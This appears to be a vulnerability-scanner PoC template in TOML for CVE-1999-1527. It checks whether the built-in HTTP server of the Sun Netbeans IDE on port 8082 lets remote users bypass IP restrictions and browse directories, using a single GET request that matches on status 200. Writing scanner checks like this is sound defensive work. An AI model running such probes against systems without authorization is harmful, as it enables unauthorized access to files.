[info]
author = "ave"
description = "检测 Sun Netbeans Java IDE 内置 HTTP 服务器（端口 8082）是否未正确执行 IP 访问控制策略。远程攻击者可直接访问服务器根路径绕过 IP 限制，获取文件目录浏览权限。"
id = "POC-AVE-1999-1162"
name = "Sun Netbeans Java IDE HTTP Server IP Restriction Bypass PoC"
severity = "high"
tags = ["ave-1999-1162"]
vuln_id = [
    "CVE-1999-1527",
    "AVE-1999-1162",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}:8082/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
